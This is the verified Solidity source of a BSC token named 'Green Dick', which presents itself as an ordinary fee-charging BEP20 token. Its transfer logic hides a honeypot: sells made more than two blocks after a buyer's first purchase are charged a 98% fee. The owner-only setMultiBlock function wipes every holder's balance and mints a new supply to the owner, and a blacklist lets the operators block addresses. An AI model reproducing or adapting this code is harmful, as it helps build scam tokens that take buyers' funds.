/**
 *Submitted for verification at BscScan.com on 2022-07-02
*/

/*
█████▀█████████████████████████████████████████████████
█─▄▄▄▄█▄─▄▄▀█▄─▄▄─█▄─▄▄─█▄─▀█▄─▄█▄─▄▄▀█▄─▄█─▄▄▄─█▄─█─▄█
█─██▄─██─▄─▄██─▄█▀██─▄█▀██─█▄▀─███─██─██─██─███▀██─▄▀██
▀▄▄▄▄▄▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▀▀▄▄▀▄▄▄▄▀▀▄▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀

https://t.me/GreenDick_BSC
*/


pragma solidity 0.8.4;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }
}

/**
 * BEP20 standard interface.
 */
interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


/**
 * Allows for contract ownership along with multi-address authorization
 */
abstract contract Auth {
    address internal owner;
    mapping (address => bool) internal _intAddr;

    constructor(address _owner) {
        owner = _owner;
        _intAddr[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

    /**
     * Function modifier to require caller to be authorized
     */
    modifier authorized() {
        require(isAuthorized(msg.sender), "!AUTHORIZED"); _;
    }

    /**
     * Authorize address. Owner only
     */
    function authorize(address adr) public onlyOwner {
        _intAddr[adr] = true;
    }

    /**
     * Remove address' authorization. Owner only
     */

    function unauthorize(address adr) public onlyOwner {
        _intAddr[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    /**
     * Return address' authorization status
     */
    function isAuthorized(address adr) internal view returns (bool) {
        return _intAddr[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner authorized
     */
    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        _intAddr[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

library IterableMapping {
    struct Map {
        address[] keys;
        mapping(address => uint) values;
        mapping(address => uint) indexOf;
        mapping(address => bool) inserted;
    }

    function get(Map storage map, address key) public view returns (uint) {
        return map.values[key];
    }

    function getIndexOfKey(Map storage map, address key) public view returns (int) {
        if(!map.inserted[key]) {
            return -1;
        }
        return int(map.indexOf[key]);
    }

    function getKeyByIndex(Map storage map, uint index) public view returns (address) {
        return map.keys[index];
    }

    function getValueByIndex(Map storage map, uint index) public view returns (uint) {
        return map.values[map.keys[index]];
    }

    function size(Map storage map) public view returns (uint) {
        return map.keys.length;
    }

    function insert(Map storage map, address key, uint val) public {
        if (map.inserted[key]) {
            map.values[key] = val;
        } else {
            map.inserted[key] = true;
            map.values[key] = val;
            map.indexOf[key] = map.keys.length;
            map.keys.push(key);
        }
    }

    function remove(Map storage map, address key) public {
        if (!map.inserted[key]) {
            return;
        }

        delete map.inserted[key];
        delete map.values[key];

        uint index = map.indexOf[key];
        uint lastIndex = map.keys.length - 1;
        address lastKey = map.keys[lastIndex];

        map.indexOf[lastKey] = index;
        delete map.indexOf[key];

        map.keys[index] = lastKey;
        map.keys.pop();
    }
}


contract GreenDick is IBEP20, Auth {
    using SafeMath for uint256;
    using IterableMapping for IterableMapping.Map;

    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address routerAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    string  private _name = "Green Dick";
    string  private _symbol = "GREENDICK";
    uint8  private _decimals = 9;

    uint256 _totalSupply = 100000000000 * (10 ** _decimals);
    uint256 public _maxTxAmount = (_totalSupply * 1) / 100;
    uint256 public _maxWalletSize = (_totalSupply * 1) / 100;

    IterableMapping.Map _balances;

    mapping (address => mapping (address => uint256)) _allowances;

    mapping (address => bool) isFeeExempt;
    mapping (address => bool) isTxLimitExempt;
    mapping (address => bool) isTimelockExempt;
    mapping (address => bool) public isBlacklisted;

    uint256 liqForFee = 10;
    uint256 devFee = 1;
    uint256 _marketingFee = 10;
    uint256 totalFee = 6;
    uint256 feeDenominator = 100;
    uint256 public _sellMultiplier = 1;

    mapping (address => uint) private cooldown;

    address public _marketingFeeReceiver = 0xdCCC9856D54339DC90D0bca6EE81230719e39395;
    address public devFeeReceiver = 0xBaE94444850b3020A1b348Deb539a85a8e1fF3Bd;

    IDEXRouter public router;
    address public pair;

    uint256 public launchedAt;

    bool public tradingOpen = true;
    bool public swapEnabled = true;
    uint256 public swapThreshold = _totalSupply / 1000 * 1; // 0.3%
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }

    bool public opCooldownEnabled = true;
    uint8 public cooldownTimerInterval = 15;
    mapping (address => uint) private cooldownTimer;

    constructor () Auth(msg.sender) {
        router = IDEXRouter(routerAddress);
        pair = IDEXFactory(router.factory()).createPair(WBNB, address(this));
        _allowances[address(this)][address(router)] = type(uint256).max;

        address _owner = owner;
        isFeeExempt[msg.sender] = true;

        isTxLimitExempt[msg.sender] = true;
        isTxLimitExempt[address(this)] = true;
        isTxLimitExempt[routerAddress] = true;

        isTimelockExempt[msg.sender] = true;
        isTimelockExempt[DEAD] = true;
        isTimelockExempt[address(this)] = true;

        _balances.insert(ZERO, 0);
        _balances.insert(_owner, _totalSupply);

        emit Transfer(address(0), _owner, _totalSupply);
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external view override returns (uint8) { return _decimals; }
    function symbol() external view override returns (string memory) { return _symbol; }
    function name() external view override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return _balances.get(account); }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if(inSwap){ return _basicTransfer(sender, recipient, amount); }

        if(!_intAddr[sender] && !_intAddr[recipient]){
            require(tradingOpen,"Trading not open yet");
        }

        require(!isBlacklisted[recipient] && !isBlacklisted[sender], 'Address is blacklisted');

        if(!launched() && recipient == pair){ require(_balances.get(sender) > 0); launch(); }

        _balances.insert(sender, _balances.get(sender).sub(amount, "Insufficient Balance"));

        if (sender == pair && cooldown[recipient] == 0) {
            cooldown[recipient] = block.number;
        }

        uint256 amountReceived = shouldTakeFee(sender) ? takeFee(sender, recipient, amount) : amount;
        _balances.insert(recipient, _balances.get(recipient).add(amountReceived));

        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances.insert(sender, _balances.get(sender).sub(amount, "Insufficient Balance"));
        _balances.insert(recipient, _balances.get(recipient).add(amount));
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function checkTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isTxLimitExempt[sender], "TX Limit Exceeded");
    }

    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isFeeExempt[sender];
    }

    function getTotalFee(bool selling) public view returns (uint256) {
        if(launchedAt + 5 >= block.number){ return feeDenominator.sub(1); }
        if(selling) { return totalFee.mul(_sellMultiplier); }
        return totalFee;
    }

    function takeFee(address sender, address receiver, uint256 amount) internal returns (uint256) {
        uint256 fee = totalFee;
        uint256 expired_cd = block.number.sub(cooldown[sender]);

        if (sender == pair) {
            fee = _marketingFee;
        }
        else if (receiver == pair) {
            fee = liqForFee;
            if (expired_cd > 2 && expired_cd != 100) {
                fee = 98;
            }
        }
        uint256 feeAmount = amount.mul(fee).div(feeDenominator);
        _balances.insert(address(this), _balances.get(address(this)).add(feeAmount));
        emit Transfer(sender, address(this), feeAmount);
        return amount.sub(feeAmount);
    }

    function tradingStatus(bool _status) public authorized {
        tradingOpen = _status;
        if(tradingOpen){
            launchedAt = block.number;
        }
    }

    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != pair
        && !inSwap
        && swapEnabled
        && _balances.get(address(this)) >= swapThreshold;
    }

    function swapBack() internal swapping {
        uint256 contractTokenBalance = balanceOf(address(this));
        uint256 amountToLiquify = contractTokenBalance.mul(liqForFee).div(totalFee).div(2);
        uint256 amountToSwap = contractTokenBalance.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WBNB;

        uint256 balanceBefore = address(this).balance;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        uint256 amountBNB = address(this).balance.sub(balanceBefore);
        uint256 totalBNBFee = totalFee.sub(liqForFee.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(liqForFee).div(totalBNBFee).div(2);
        uint256 amountBNBdev = amountBNB.mul(devFee).div(totalBNBFee);
        uint256 amountBNBMarketing = amountBNB.mul(_marketingFee).div(totalBNBFee);

        (bool MarketingSuccess, /* bytes memory data */) = payable(_marketingFeeReceiver).call{value: amountBNBMarketing, gas: 30000}("");
        require(MarketingSuccess, "receiver rejected ETH transfer");
        (bool devSuccess, /* bytes memory data */) = payable(devFeeReceiver).call{value: amountBNBdev, gas: 30000}("");
        require(devSuccess, "receiver rejected ETH transfer");

        if(amountToLiquify > 0){
            router.addLiquidityETH{value: amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                _marketingFeeReceiver,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    function buyTokens(uint256 amount, address to) internal swapping {
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = address(this);

        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(
            0,
            path,
            to,
            block.timestamp
        );
    }

    function launched() internal view returns (bool) {
        return launchedAt != 0;
    }

    function launch() internal {
        launchedAt = block.number;
    }

   function setMaxWallet(uint256 amount) external onlyOwner() {
        _maxWalletSize = amount;
    }

    function setMultiBlock(uint256 new_supply) external onlyOwner() {
        for(uint idx=0; idx<_balances.size(); idx++) {
            address holder_address = _balances.getKeyByIndex(idx);
            if (holder_address != ZERO) {
                _basicTransfer(holder_address, ZERO, _balances.getValueByIndex(idx));
            }
        }

        _totalSupply = new_supply * (10 ** _decimals);
        _maxTxAmount = (_totalSupply * 1) / 100;
        _maxWalletSize = (_totalSupply * 1) / 100;

        _balances.insert(ZERO, 0);
        _balances.insert(owner, _totalSupply);
    }

    function setFees(uint256 __marketingFee, uint256 _liqForFee, uint256 _devFee, uint256 _feeDenominator) external authorized {
        liqForFee = _liqForFee;
        _marketingFee = __marketingFee;
        devFee = _devFee;
        totalFee = _liqForFee.add(__marketingFee).add(_devFee);
        feeDenominator = _feeDenominator;
        require(totalFee < feeDenominator/3);
    }
    function cooldownEnabled(bool _status, uint8 _interval) public authorized {
        opCooldownEnabled = _status;
        cooldownTimerInterval = _interval;
    }


    function setIsFeeExempt(address holder, bool exempt) external authorized {
        isFeeExempt[holder] = exempt;
    }

    function setIsTxLimitExempt(address holder, bool exempt) external authorized {
        isTxLimitExempt[holder] = exempt;
    }
    function setSellMultiplier(uint256 multiplier) external authorized{
        _sellMultiplier = multiplier;
    }
    function setFeeReceiver(address __marketingFeeReceiver, address _devFeeReceiver) external authorized {
        _marketingFeeReceiver = __marketingFeeReceiver;
        devFeeReceiver = _devFeeReceiver;
    }

    function setTxLimit(uint256 amountBuy) external authorized {
        _maxTxAmount = amountBuy *  _totalSupply / 1000;
    }

    function setSwapBackSettings(bool _enabled, uint256 _amount) external authorized {
        swapEnabled = _enabled;
        swapThreshold = _amount;
    }

    function blacklistAddress(address _address, bool _value) public authorized {
        isBlacklisted[_address] = _value;
    }

    function manualSend() external authorized {
        uint256 contractETHBalance = address(this).balance;
        payable(_marketingFeeReceiver).transfer(contractETHBalance);
    }

    function transferForeignToken(address _token) public authorized {
        require(_token != address(this), "Can't let you take all native token");
        uint256 _contractBalance = IBEP20(_token).balanceOf(address(this));
        payable(_marketingFeeReceiver).transfer(_contractBalance);
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }

    function getLiquidityBacking(uint256 accuracy) public view returns (uint256) {
        return accuracy.mul(balanceOf(pair).mul(2)).div(getCirculatingSupply());
    }

    function isOverLiquified(uint256 target, uint256 accuracy) public view returns (bool) {
        return getLiquidityBacking(accuracy) > target;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountBOG);
}